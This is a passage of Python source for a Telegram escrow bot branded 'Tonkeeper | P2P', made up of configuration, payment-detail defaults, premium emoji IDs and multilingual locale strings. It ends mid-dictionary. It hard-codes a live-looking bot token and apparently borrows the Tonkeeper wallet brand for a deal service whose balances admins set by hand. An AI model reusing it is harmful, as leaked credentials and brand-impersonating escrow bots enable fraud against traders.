import asyncio
import json
import os
import uuid
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties

# ========== КОНФИГ ==========
BOT_TOKEN = "8832955909:AAEjgJF_JXu5oPvufUt1oL7klfpMqa-yq1o"
MASTER_ADMIN_ID = 8002472821
SUPPORT_LINK = "@p2psupporttonbot"
BOT_USERNAME = "tonkeeperdealcbot"
BOT_NAME = " Tonkeeper | P2P"
CHANNEL_LINK = "https://t.me/tonkeeper_ru"

# ========== ПОДДЕРЖИВАЕМЫЕ ЯЗЫКИ ==========
LANGUAGES = {
    "ru": "🇷🇺 Русский",
    "en": "🇬🇧 English",
    "zh": "🇨🇳 中文",
    "ar": "🇸🇦 العربية"
}

# ========== ПРЕМИУМ ЭМОДЗИ (ВСЕ ID ИЗ ТВОИХ СПИСКОВ) ==========
P = {
    "🔥": "5208513917965328345",
    "❤️": "5208806229144524155",
    "💎": "5316583751923290826",
    "💰": "5208954744818651087",
    "⭐️": "5208446474093876113",
    "✨": "5208424793098968198",
    "✅": "5208422125924275090",
    "❌": "5208480322731137426",
    "❓": "5208739588431957814",
    "❗️": "5208431570557360595",
    "⚠️": "5206371334875012678",
    "➕": "5208964052012780755",
    "➖": "5208583212967680239",
    "➡️": "5319187743350217782",
    "◀️": "5316635411789931847",
    "⬆️": "5316991155341125587",
    "⬇️": "5317005105394901648",
    "👑": "5316716234484506715",
    "👤": "5206193858236406745",
    "👍": "5208822833488091726",
    "👎": "5208933295751977679",
    "📱": "5208752434679142939",
    "📊": "5208846279714560254",
    "📦": "5208752434679142939",
    "📝": "5208752434679142939",
    "📌": "5208548453797352937",
    "🔗": "5208730126619005798",
    "🔒": "5208876722442753552",
    "🔔": "5208964052012780755",
    "🔙": "5316635411789931847",
    "🔽": "5317005105394901648",
    "💳": "5316583751923290826",
    "💬": "5296258510684712098",
    "💲": "5208497914917179963",
    "💱": "5208929984332191234",
    "🏆": "5208479459442708955",
    "🏴‍☠️": "5316995828265538844",
    "🎁": "5235695112419303615",
    "🔧": "5208694736088488348",
    "⚙️": "5208694736088488348",
    "🖼": "5203977968644288289",
    "📷": "5373056919688731596",
    "✏️": "5301173701323028420",
    "⌛": "5318940267334622539",
    "⏳": "5318940267334622539",
    "🚀": "5258332798409783582",
    "✈️": "5208619118894273325",
    "🌐": "5208773063407066255",
    "🪙": "5316583751923290826",
    "👛": "5316583751923290826",
    "🐶": "5433776470080107054",
    "🐱": "5246792792516082598",
    "🐈": "5316847239576970469",
    "🐆": "5316824802667813116",
    "🤖": "5197252827247841976",
    "🥷": "5206338766138007521",
    "👻": "5208581293117298225",
    "💀": "5318857718063192007",
    "🦖": "5318852478203091165",
    "🕷": "5208813534883897052",
    "🕸": "5208805254186948298",
    "🌈": "5206493268996546666",
    "⭐": "5208446474093876113",
    "🌟": "5208938110410314809",
    "💫": "5208957270259425030",
    "💯": "5319168016565424610",
    "‼️": "5319183916534354992",
    "⁉️": "5206298861596861762",
    "0️⃣": "5206375917605119584",
    "1️⃣": "5208967788634331369",
    "2️⃣": "5208451293047182923",
    "3️⃣": "5208944947998249032",
    "4️⃣": "5208834721957564558",
    "5️⃣": "5208576293775364525",
    "6️⃣": "5208663374237292374",
    "7️⃣": "5208837848693779350",
    "8️⃣": "5208548647070881692",
    "9️⃣": "5208420442297094974",
    "📉": "5208497914917179963",
    "📞": "5208764937328940427",
    "⏰": "5208481478077338787",
    "📢": "5208572771902182077",
    "🆘": "5206186324863769699",
    "🔍": "5206531640234368505",
    "📭": "5208739588431957814",
    "👇": "5317005105394901648",
    "🔐": "5208876722442753552",
    "🛡️": "5316898985342952232",
    "🤝": "5206472897966660789",
    "📋": "5208846279714560254",
    "⚡️": "5206186324863769699",
    "🔑": "5316583751923290826",
    "🏠": "5305757775752620395",
}


def pm(emoji_char: str) -> str:
    emoji_id = P.get(emoji_char)
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{emoji_char}</tg-emoji>'
    return emoji_char


def premium_button(text: str, callback_data: str, emoji_char: str = None) -> InlineKeyboardButton:
    if emoji_char and emoji_char in P:
        return InlineKeyboardButton(
            text=text,
            icon_custom_emoji_id=P[emoji_char],
            callback_data=callback_data
        )
    return InlineKeyboardButton(text=text, callback_data=callback_data)


bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ========== ФАЙЛЫ ==========
DEALS_FILE = "deals.json"
ADMINS_FILE = "admins.json"
BALANCE_FILE = "balance.json"
REKVISITS_FILE = "rekvisits.json"
START_PHOTO_FILE = "start_photo.json"
WITHDRAW_REQUESTS_FILE = "withdraw_requests.json"
USER_LANGUAGE_FILE = "user_language.json"


def load_deals():
    if os.path.exists(DEALS_FILE):
        with open(DEALS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}


def save_deals(deals):
    with open(DEALS_FILE, 'w', encoding='utf-8') as f:
        json.dump(deals, f, indent=2, ensure_ascii=False)


def load_admins():
    if os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, 'r', encoding='utf-8') as f:
            return set(json.load(f))
    return {MASTER_ADMIN_ID}


def save_admins(admins):
    with open(ADMINS_FILE, 'w', encoding='utf-8') as f:
        json.dump(list(admins), f, indent=2)


def load_balance():
    if os.path.exists(BALANCE_FILE):
        with open(BALANCE_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}


def save_balance(balance):
    with open(BALANCE_FILE, 'w', encoding='utf-8') as f:
        json.dump(balance, f, indent=2, ensure_ascii=False)


def load_rekvisits():
    if os.path.exists(REKVISITS_FILE):
        with open(REKVISITS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {
        "ton": "💎 ОПЛАТА TON\n\nПереведите TON на кошелек:\nUQCD3wX5Y5G5d8F5J8K9L0Z1X2C3V4B5N6M7A8S9D0F1G2H3\n\nСумма: {amount} TON",
        "stars": "⭐️ ОПЛАТА ЗВЁЗДАМИ\n\nОтправьте звёзды в бота: @{BOT_USERNAME}\n\nСумма: {amount} STARS",
        "rub": "💰 ОПЛАТА РУБЛЯМИ\n\nПереведите на карту:\n2200 1234 5678 9012\nТинькофф\n\nСумма: {amount} RUB",
        "uah": "🌐 ОПЛАТА ГРИВНАМИ\n\nПереведите на карту:\n4149 5678 1234 5678\nПриватБанк\n\nСумма: {amount} UAH"
    }


def save_rekvisits(rekvisits):
    with open(REKVISITS_FILE, 'w', encoding='utf-8') as f:
        json.dump(rekvisits, f, indent=2, ensure_ascii=False)


def load_start_photo():
    if os.path.exists(START_PHOTO_FILE):
        with open(START_PHOTO_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"file_id": None}


def save_start_photo(data):
    with open(START_PHOTO_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)


def load_withdraw_requests():
    if os.path.exists(WITHDRAW_REQUESTS_FILE):
        with open(WITHDRAW_REQUESTS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}


def save_withdraw_requests(requests):
    with open(WITHDRAW_REQUESTS_FILE, 'w', encoding='utf-8') as f:
        json.dump(requests, f, indent=2, ensure_ascii=False)


def load_user_language():
    if os.path.exists(USER_LANGUAGE_FILE):
        with open(USER_LANGUAGE_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}


def save_user_language(lang_data):
    with open(USER_LANGUAGE_FILE, 'w', encoding='utf-8') as f:
        json.dump(lang_data, f, indent=2, ensure_ascii=False)


deals = load_deals()
admins = load_admins()
balance = load_balance()
rekvisits = load_rekvisits()
start_photo = load_start_photo()
withdraw_requests = load_withdraw_requests()
user_language = load_user_language()


# ========== ЛОКАЛИЗАЦИЯ ВСЕХ СООБЩЕНИЙ ==========
LOCALE = {
    "ru": {
        "bot_name": "Deals Tonkeeper",
        "bot_desc": "БЕЗОПАСНЫЕ СДЕЛКИ",
        "feature1": "Честные сделки между продавцами и покупателями",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "Гарант безопасности с обеих сторон",
        "feature4": "Премиум поддержка 24/7",
        "how_it_works": "КАК ЭТО РАБОТАЕТ",
        "step1": "Продавец создаёт сделку",
        "step2": "Продавец отправляет ссылку покупателю",
        "step3": "Покупатель выбирает способ оплаты",
        "step4": "Администратор проверяет оплату",
        "step5": "Продавец нажимает «Передал товар»",
        "step6": "Покупатель нажимает «Получил товар»",
        "step7": "Деньги зачисляются на баланс продавца",
        "our_channel": "НАШ КАНАЛ",
        "support": "ПОДДЕРЖКА",
        "support_contact": "@p2psupporttonbot",
        "start_now": "НАЧНИ ПРЯМО СЕЙЧАС",
        "create_deal": "СОЗДАТЬ СДЕЛКУ",
        "my_balance": "МОЙ БАЛАНС",
        "my_deals": "МОИ СДЕЛКИ",
        "premium": "ПРЕМИУМ",
        "faq": "FAQ",
        "channel": "КАНАЛ",
        "admin_panel": "АДМИН ПАНЕЛЬ",
        "choose_action": "ВЫБЕРИТЕ ДЕЙСТВИЕ",
        "describe_product": "ОПИШИТЕ ТОВАР ИЛИ УСЛУГУ, КОТОРУЮ ВЫ ПРОДАЁТЕ",
        "example_product": "ПРИМЕР: NFT-подарок Telegram Premium",
        "choose_currency": "ВЫБЕРИТЕ ВАЛЮТУ СДЕЛКИ",
        "enter_amount": "ВВЕДИТЕ СУММУ СДЕЛКИ",
        "enter_buyer": "ВВЕДИТЕ TELEGRAM USERNAME ПОКУПАТЕЛЯ",
        "buyer_username_example": "ПРИМЕР: john_doe",
        "only_this_user": "ТОЛЬКО ЭТОТ ПОЛЬЗОВАТЕЛЬ СМОЖЕТ ЗАЙТИ В СДЕЛКУ",
        "deal_created": "СДЕЛКА СОЗДАНА",
        "send_link_to_buyer": "ОТПРАВЬТЕ ЭТУ ССЫЛКУ ПОКУПАТЕЛЮ",
        "your_balance": "ВАШ БАЛАНС",
        "withdraw_funds": "ВЫВЕСТИ СРЕДСТВА",
        "main_menu": "ГЛАВНОЕ МЕНЮ",
        "no_deals": "У ВАС НЕТ СДЕЛОК",
        "your_deals": "ВАШИ СДЕЛКИ",
        "premium_status": "ПРЕМИУМ СТАТУС",
        "premium_privileges": "ПРИВИЛЕГИИ",
        "premium_1": "ПРИОРИТЕТНАЯ ПОДДЕРЖКА 24/7",
        "premium_2": "СНИЖЕННАЯ КОМИССИЯ (0%)",
        "premium_3": "РАННИЙ ДОСТУП К НОВЫМ ФУНКЦИЯМ",
        "premium_4": "ЭКСКЛЮЗИВНЫЕ NFT-НАГРАДЫ",
        "premium_active": "ВАШ СТАТУС: АКТИВЕН",
        "faq_q1": "КАК НАЧАТЬ СДЕЛКУ?",
        "faq_a1": "НАЖМИТЕ «СОЗДАТЬ СДЕЛКУ» И СЛЕДУЙТЕ ИНСТРУКЦИИ.",
        "faq_q2": "КАКИЕ ВАЛЮТЫ ДОСТУПНЫ?",
        "faq_a2": "TON | STARS | RUB | UAH",
        "faq_q3": "КАК Я ПОЛУЧУ ОПЛАТУ?",
        "faq_a3": "ПОСЛЕ ПОДТВЕРЖДЕНИЯ ПОКУПАТЕЛЯ ДЕНЬГИ НА БАЛАНС.",
        "faq_q4": "КАК ВЫВЕСТИ ДЕНЬГИ?",
        "faq_a4": "«МОЙ БАЛАНС» → ВЫБРАТЬ ВАЛЮТУ → УКАЗАТЬ РЕКВИЗИТЫ",
        "faq_q5": "БЕЗОПАСНО ЛИ ЭТО?",
        "faq_a5": "ДА! АДМИНИСТРАТОР ПРОВЕРЯЕТ ОПЛАТУ.",
        "faq_q6": "СКОЛЬКО ВРЕМЕНИ ЗАНИМАЕТ ВЫВОД?",
        "faq_a6": "1-5 МИНУТ ПОСЛЕ ПОДТВЕРЖДЕНИЯ.",
        "faq_q7": "КАК СВЯЗАТЬСЯ С ПОДДЕРЖКОЙ?",
        "faq_a7": "НАЖМИТЕ КНОПКУ «КАНАЛ» ИЛИ ПИШИТЕ В ПОДДЕРЖКУ @p2psupporttonbot",
        "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА ИЛИ УЖЕ ЗАВЕРШЕНА",
        "access_denied": "ДОСТУП ЗАПРЕЩЁН",
        "invalid_amount": "ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО",
        "payment_confirmed": "ОПЛАТА ПОДТВЕРЖДЕНА",
        "seller_confirmed": "ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА",
        "buyer_confirmed": "ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА",
        "deal_completed": "СДЕЛКА ЗАВЕРШЕНА",
        "insufficient_balance": "НЕДОСТАТОЧНО СРЕДСТВ НА БАЛАНСЕ",
        "choose_payment_method": "ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ",
        "pay_by_rekvisits": "ОПЛАТИТЬ ПО РЕКВИЗИТАМ",
        "pay_by_balance": "ОПЛАТИТЬ С БАЛАНСА",
        "status_waiting": "ОЖИДАНИЕ ОПЛАТЫ",
        "status_paid": "ОПЛАЧЕНО",
        "status_awaiting": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
        "status_completed": "ЗАВЕРШЕНО",
        "select_language": "ВЫБРАТЬ ЯЗЫК",
        "welcome": "ДОБРО ПОЖАЛОВАТЬ",
        "choose_language_prompt": "🇷🇺 🇬🇧 🇨🇳 🇸🇦\n\nВЫБЕРИТЕ ЯЗЫК ДЛЯ ПРОДОЛЖЕНИЯ:",
        "product": "ТОВАР",
        "amount": "СУММА",
        "seller": "ПРОДАВЕЦ",
        "buyer": "ПОКУПАТЕЛЬ",
        "deal": "СДЕЛКА",
        "waiting_for_delivery": "ОЖИДАНИЕ ПЕРЕДАЧИ ТОВАРА",
        "seller_delivered": "ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР",
        "confirm_receipt": "ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ",
        "contact_support": "В ПОДДЕРЖКУ",
        "balance_topped_up": "ВАШ БАЛАНС ПОПОЛНЕН",
        "withdraw_request_created": "ЗАЯВКА НА ВЫВОД СОЗДАНА",
        "withdraw_pending": "ОЖИДАЙТЕ ВЫВОДА 1-5 МИНУТ",
        "withdraw_completed": "ВЫВОД ПОДТВЕРЖДЁН",
        "no_active_requests": "НЕТ АКТИВНЫХ ЗАЯВОК",
        "admin_rights": "НЕДОСТАТОЧНО ПРАВ",
        "cmd_usage": "ИСПОЛЬЗОВАНИЕ",
        "request_not_found": "ЗАЯВКА НЕ НАЙДЕНА",
        "request_already_processed": "ЗАЯВКА УЖЕ ОБРАБОТАНА",
        "photo_updated": "ФОТО ОБНОВЛЕНО",
        "send_photo": "ОТПРАВЬТЕ ФОТО",
        "user_not_found": "ПОЛЬЗОВАТЕЛЬ НЕ НАЙДЕН",
        "balance_added": "БАЛАНС НАЧИСЛЕН",
        "rekvisits_updated": "РЕКВИЗИТЫ ОБНОВЛЕНЫ",
        "admin_added": "АДМИН ДОБАВЛЕН",
        "admin_removed": "АДМИН УДАЛЁН",
        "cannot_remove_master": "НЕЛЬЗЯ УДАЛИТЬ ГЛАВНОГО АДМИНА",
        "admin_list": "СПИСОК АДМИНОВ",
        "no_deals_total": "НЕТ СДЕЛОК",
        "all_deals_title": "ВСЕ СДЕЛКИ",
        "payment_details": "РЕКВИЗИТЫ ОПЛАТЫ",
        "edit_rekvisits_title": "РЕДАКТИРОВАНИЕ РЕКВИЗИТОВ",
        "enter_new_text": "ВВЕДИТЕ НОВЫЙ ТЕКСТ",
        "use_amount_placeholder": "ИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ",
        "enter_user_id": "ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ",
        "enter_withdraw_details": "ВВЕДИТЕ РЕКВИЗИТЫ ДЛЯ ВЫВОДА",
        "enter_withdraw_username": "ВВЕДИТЕ ВАШ TELEGRAM USERNAME",
        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
        "copy_link": "СКОПИРУЙТЕ ССЫЛКУ",
        "after_payment_notify": "ПОСЛЕ ОПЛАТЫ ВЫ ПОЛУЧИТЕ УВЕДОМЛЕНИЕ",
        "payment_verified": "ОПЛАТА ПРОВЕРЕНА",
        "funds_deducted": "СРЕДСТВА СПИСАНЫ",
        "product_delivered": "ТОВАР ПЕРЕДАН",
        "deal_completed_msg": "СПАСИБО ЗА ДОВЕРИЕ",
        "funds_added_to_balance": "СРЕДСТВА ЗАЧИСЛЕНЫ НА БАЛАНС",
        "for_user": "ДЛЯ",
        "need": "НУЖНО",
        "available": "ДОСТУПНО",
        "currency": "ВАЛЮТА",
        "created": "СОЗДАНА",
        "status": "СТАТУС",
        "check_status": "ПРОВЕРИТЬ СТАТУС",
        "example": "ПРИМЕР",
        "subscribe": "ПОДПИСЫВАЙТЕСЬ",
        "channel_content": "В КАНАЛЕ:\n• НОВОСТИ И ОБНОВЛЕНИЯ\n• ПОЛЕЗНЫЕ ГАЙДЫ\n• РОЗЫГРЫШИ И БОНУСЫ\n• АКТУАЛЬНЫЕ КУРСЫ ВАЛЮТ",
        "click_subscribe": "ЖМИ НА ССЫЛКУ И ПОДПИСЫВАЙСЯ",
        "thank_you": "СПАСИБО, ЧТО ВЫ С НАМИ"
    },
    "en": {
        "bot_name": "Deals Tonkeeper",
        "bot_desc": "SECURE DEALS",
        "feature1": "Fair deals between sellers and buyers",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "Security guarantee from both sides",
        "feature4": "Premium 24/7 support",
        "how_it_works": "HOW IT WORKS",
        "step1": "Seller creates a deal",
        "step2": "Seller sends link to buyer",
        "step3": "Buyer chooses payment method",
        "step4": "Admin verifies payment",
        "step5": "Seller clicks 'Delivered'",
        "step6": "Buyer clicks 'Received'",
        "step7": "Money credited to seller's balance",
        "our_channel": "OUR CHANNEL",
        "support": "SUPPORT",
        "support_contact": "@p2psupporttonbot",
        "start_now": "START NOW",
        "create_deal": "CREATE DEAL",
        "my_balance": "MY BALANCE",
        "my_deals": "MY DEALS",
        "premium": "PREMIUM",
        "faq": "FAQ",
        "channel": "CHANNEL",
        "admin_panel": "ADMIN PANEL",
        "choose_action": "CHOOSE ACTION",
        "describe_product": "DESCRIBE THE PRODUCT OR SERVICE YOU ARE SELLING",
        "example_product": "EXAMPLE: NFT gift Telegram Premium",
        "choose_currency": "CHOOSE DEAL CURRENCY",
        "enter_amount": "ENTER DEAL AMOUNT",
        "enter_buyer": "ENTER BUYER'S TELEGRAM USERNAME",
        "buyer_username_example": "EXAMPLE: john_doe",
        "only_this_user": "ONLY THIS USER CAN ACCESS THE DEAL",
        "deal_created": "DEAL CREATED",
        "send_link_to_buyer": "SEND THIS LINK TO THE BUYER",
        "your_balance": "YOUR BALANCE",
        "withdraw_funds": "WITHDRAW FUNDS",
        "main_menu": "MAIN MENU",
        "no_deals": "YOU HAVE NO DEALS",
        "your_deals": "YOUR DEALS",
        "premium_status": "PREMIUM STATUS",
        "premium_privileges": "PRIVILEGES",
        "premium_1": "PRIORITY 24/7 SUPPORT",
        "premium_2": "REDUCED COMMISSION (0%)",
        "premium_3": "EARLY ACCESS TO NEW FEATURES",
        "premium_4": "EXCLUSIVE NFT REWARDS",
        "premium_active": "YOUR STATUS: ACTIVE",
        "faq_q1": "HOW TO START A DEAL?",
        "faq_a1": "CLICK 'CREATE DEAL' AND FOLLOW THE INSTRUCTIONS.",
        "faq_q2": "WHAT CURRENCIES ARE AVAILABLE?",
        "faq_a2": "TON | STARS | RUB | UAH",
        "faq_q3": "HOW DO I RECEIVE PAYMENT?",
        "faq_a3": "AFTER BUYER CONFIRMATION, MONEY GOES TO BALANCE.",
        "faq_q4": "HOW TO WITHDRAW MONEY?",
        "faq_a4": "'MY BALANCE' → SELECT CURRENCY → ENTER DETAILS",
        "faq_q5": "IS IT SAFE?",
        "faq_a5": "YES! ADMIN VERIFIES ALL PAYMENTS.",
        "faq_q6": "HOW LONG DOES WITHDRAWAL TAKE?",
        "faq_a6": "1-5 MINUTES AFTER CONFIRMATION.",
        "faq_q7": "HOW TO CONTACT SUPPORT?",
        "faq_a7": "CLICK 'CHANNEL' BUTTON OR MESSAGE SUPPORT @p2psupporttonbot",
        "deal_not_found": "DEAL NOT FOUND OR ALREADY COMPLETED",
        "access_denied": "ACCESS DENIED",
        "invalid_amount": "ENTER A POSITIVE NUMBER",
        "payment_confirmed": "PAYMENT CONFIRMED",
        "seller_confirmed": "YOU CONFIRMED PRODUCT DELIVERY",
        "buyer_confirmed": "YOU CONFIRMED PRODUCT RECEIPT",
        "deal_completed": "DEAL COMPLETED",
        "insufficient_balance": "INSUFFICIENT BALANCE",
        "choose_payment_method": "CHOOSE PAYMENT METHOD",
        "pay_by_rekvisits": "PAY BY DETAILS",
        "pay_by_balance": "PAY FROM BALANCE",
        "status_waiting": "WAITING FOR PAYMENT",
        "status_paid": "PAID",
        "status_awaiting": "AWAITING CONFIRMATION",
        "status_completed": "COMPLETED",
        "select_language": "SELECT LANGUAGE",
        "welcome": "WELCOME",
        "choose_language_prompt": "🇷🇺 🇬🇧 🇨🇳 🇸🇦\n\nSELECT YOUR LANGUAGE TO CONTINUE:",
        "product": "PRODUCT",
        "amount": "AMOUNT",
        "seller": "SELLER",
        "buyer": "BUYER",
        "deal": "DEAL",
        "waiting_for_delivery": "WAITING FOR DELIVERY",
        "seller_delivered": "SELLER DELIVERED PRODUCT",
        "confirm_receipt": "CONFIRM RECEIPT",
        "contact_support": "CONTACT SUPPORT",
        "balance_topped_up": "YOUR BALANCE HAS BEEN TOPPED UP",
        "withdraw_request_created": "WITHDRAWAL REQUEST CREATED",
        "withdraw_pending": "PLEASE WAIT 1-5 MINUTES",
        "withdraw_completed": "WITHDRAWAL CONFIRMED",
        "no_active_requests": "NO ACTIVE REQUESTS",
        "admin_rights": "INSUFFICIENT RIGHTS",
        "cmd_usage": "USAGE",
        "request_not_found": "REQUEST NOT FOUND",
        "request_already_processed": "REQUEST ALREADY PROCESSED",
        "photo_updated": "PHOTO UPDATED",
        "send_photo": "SEND A PHOTO",
        "user_not_found": "USER NOT FOUND",
        "balance_added": "BALANCE ADDED",
        "rekvisits_updated": "PAYMENT DETAILS UPDATED",
        "admin_added": "ADMIN ADDED",
        "admin_removed": "ADMIN REMOVED",
        "cannot_remove_master": "CANNOT REMOVE MASTER ADMIN",
        "admin_list": "ADMIN LIST",
        "no_deals_total": "NO DEALS",
        "all_deals_title": "ALL DEALS",
        "payment_details": "PAYMENT DETAILS",
        "edit_rekvisits_title": "EDIT PAYMENT DETAILS",
        "enter_new_text": "ENTER NEW TEXT",
        "use_amount_placeholder": "USE {amount} FOR AMOUNT PLACEHOLDER",
        "enter_user_id": "ENTER USER TELEGRAM ID",
        "enter_withdraw_details": "ENTER WITHDRAWAL DETAILS",
        "enter_withdraw_username": "ENTER YOUR TELEGRAM USERNAME",
        "deal_link_text": "LINK FOR BUYER",
        "copy_link": "COPY THE LINK",
        "after_payment_notify": "YOU WILL RECEIVE NOTIFICATION AFTER PAYMENT",
        "payment_verified": "PAYMENT VERIFIED",
        "funds_deducted": "FUNDS DEDUCTED",
        "product_delivered": "PRODUCT DELIVERED",
        "deal_completed_msg": "THANK YOU FOR YOUR TRUST",
        "funds_added_to_balance": "FUNDS ADDED TO BALANCE",
        "for_user": "FOR",
        "need": "NEEDED",
        "available": "AVAILABLE",
        "currency": "CURRENCY",
        "created": "CREATED",
        "status": "STATUS",
        "check_status": "CHECK STATUS",
        "example": "EXAMPLE",
        "subscribe": "SUBSCRIBE",
        "channel_content": "IN THE CHANNEL:\n• NEWS AND UPDATES\n• USEFUL GUIDES\n• GIVEAWAYS AND BONUSES\n• CURRENT EXCHANGE RATES",
        "click_subscribe": "CLICK THE LINK AND SUBSCRIBE",
        "thank_you": "THANK YOU FOR BEING WITH US"
    },
    "zh": {
        "bot_name": "Deals Tonkeeper",
        "bot_desc": "安全交易",
        "feature1": "买卖双方公平交易",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "双方安全保障",
        "feature4": "24/7高级支持",
        "how_it_works": "运作方式",
        "step1": "卖家创建交易",
        "step2": "卖家发送链接给买家",
        "step3": "买家选择支付方式",
        "step4": "管理员验证付款",
        "step5": "卖家点击「已交付」",
        "step6": "买家点击「已收到」",
        "step7": "款项计入卖家余额",
        "our_channel": "我们的频道",
        "support": "支持",
        "support_contact": "@p2psupporttonbot",
        "start_now": "立即开始",
        "create_deal": "创建交易",
        "my_balance": "我的余额",
        "my_deals": "我的交易",
        "premium": "高级会员",
        "faq": "常见问题",
        "channel": "频道",
        "admin_panel": "管理面板",
        "choose_action": "选择操作",
        "describe_product": "描述您出售的商品或服务",
        "example_product": "示例：NFT礼物 Telegram Premium",
        "choose_currency": "选择交易货币",
        "enter_amount": "输入交易金额",
        "enter_buyer": "输入买家的Telegram用户名",
        "buyer_username_example": "示例：john_doe",
        "only_this_user": "只有此用户可以访问交易",
        "deal_created": "交易已创建",
        "send_link_to_buyer": "将此链接发送给买家",
        "your_balance": "您的余额",
        "withdraw_funds": "提取资金",
        "main_menu": "主菜单",
        "no_deals": "您没有任何交易",
        "your_deals": "您的交易",
        "premium_status": "高级会员状态",
        "premium_privileges": "特权",
        "premium_1": "24/7优先支持",
        "premium_2": "降低手续费 (0%)",
        "premium_3": "新功能抢先体验",
        "premium_4": "独家NFT奖励",
        "premium_active": "您的状态：激活",
        "faq_q1": "如何开始交易？",
        "faq_a1": "点击「创建交易」并按照说明操作。",
        "faq_q2": "支持哪些货币？",
        "faq_a2": "TON | STARS | RUB | UAH",
        "faq_q3": "如何收到付款？",
        "faq_a3": "买家确认后，款项将计入余额。",
        "faq_q4": "如何提现？",
        "faq_a4": "「我的余额」→ 选择货币 → 输入信息",
        "faq_q5": "安全吗？",
        "faq_a5": "是的！管理员验证所有付款。",
        "faq_q6": "提现需要多长时间？",
        "faq_a6": "确认后1-5分钟。",
        "faq_q7": "如何联系支持？",
        "faq_a7": "点击「频道」按钮或联系客服 @p2psupporttonbot",
        "deal_not_found": "交易未找到或已完成",
        "access_denied": "访问被拒绝",
        "invalid_amount": "输入正数",
        "payment_confirmed": "付款已确认",
        "seller_confirmed": "您已确认交付商品",
        "buyer_confirmed": "您已确认收到商品",
        "deal_completed": "交易已完成",
        "insufficient_balance": "余额不足",
        "choose_payment_method": "选择支付方式",
        "pay_by_rekvisits": "按信息付款",
        "pay_by_balance": "从余额付款",
        "status_waiting": "等待付款",
        "status_paid": "已付款",
        "status_awaiting": "等待确认",
        "status_completed": "已完成",
        "select_language": "选择语言",
        "welcome": "欢迎",
        "choose_language_prompt": "🇷🇺 🇬🇧 🇨🇳 🇸🇦\n\n选择您的语言以继续:",
        "product": "商品",
        "amount": "金额",
        "seller": "卖家",
        "buyer": "买家",
        "deal": "交易",
        "waiting_for_delivery": "等待交付",
        "seller_delivered": "卖家已交付商品",
        "confirm_receipt": "确认收到",
        "contact_support": "联系客服",
        "balance_topped_up": "您的余额已充值",
        "withdraw_request_created": "提现申请已创建",
        "withdraw_pending": "请等待1-5分钟",
        "withdraw_completed": "提现已确认",
        "no_active_requests": "无活跃申请",
        "admin_rights": "权限不足",
        "cmd_usage": "使用方法",
        "request_not_found": "申请未找到",
        "request_already_processed": "申请已处理",
        "photo_updated": "照片已更新",
        "send_photo": "发送照片",
        "user_not_found": "用户未找到",
        "balance_added": "余额已添加",
        "rekvisits_updated": "支付信息已更新",
        "admin_added": "管理员已添加",
        "admin_removed": "管理员已移除",
        "cannot_remove_master": "无法移除主管理员",
        "admin_list": "管理员列表",
        "no_deals_total": "无交易",
        "all_deals_title": "所有交易",
        "payment_details": "支付信息",
        "edit_rekvisits_title": "编辑支付信息",
        "enter_new_text": "输入新文本",
        "use_amount_placeholder": "使用 {amount} 作为金额占位符",
        "enter_user_id": "输入用户Telegram ID",
        "enter_withdraw_details": "输入提现信息",
        "enter_withdraw_username": "输入您的Telegram用户名",
        "deal_link_text": "买家链接",
        "copy_link": "复制链接",
        "after_payment_notify": "付款后您将收到通知",
        "payment_verified": "付款已验证",
        "funds_deducted": "资金已扣除",
        "product_delivered": "商品已交付",
        "deal_completed_msg": "感谢您的信任",
        "funds_added_to_balance": "资金已添加到余额",
        "for_user": "给",
        "need": "需要",
        "available": "可用",
        "currency": "货币",
        "created": "创建于",
        "status": "状态",
        "check_status": "检查状态",
        "example": "示例",
        "subscribe": "订阅",
        "channel_content": "频道内容：\n• 新闻和更新\n• 实用指南\n• 赠品和奖金\n• 最新汇率",
        "click_subscribe": "点击链接并订阅",
        "thank_you": "感谢您的支持"
    },
    "ar": {
        "bot_name": "Deals Tonkeeper",
        "bot_desc": "صفقات آمنة",
        "feature1": "صفقات عادلة بين البائعين والمشترين",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "ضمان الأمن من كلا الجانبين",
        "feature4": "دعم بريميوم 24/7",
        "how_it_works": "كيف يعمل",
        "step1": "البائع ينشئ صفقة",
        "step2": "البائع يرسل الرابط للمشتري",
        "step3": "المشتري يختار طريقة الدفع",
        "step4": "المدقق يتحقق من الدفع",
        "step5": "البائع يضغط «تم التسليم»",
        "step6": "المشتري يضغط «تم الاستلام»",
        "step7": "تضاف الأموال إلى رصيد البائع",
        "our_channel": "قناتنا",
        "support": "الدعم",
        "support_contact": "@p2psupporttonbot",
        "start_now": "ابدأ الآن",
        "create_deal": "إنشاء صفقة",
        "my_balance": "رصيدي",
        "my_deals": "صفقاتي",
        "premium": "بريميوم",
        "faq": "أسئلة شائعة",
        "channel": "القناة",
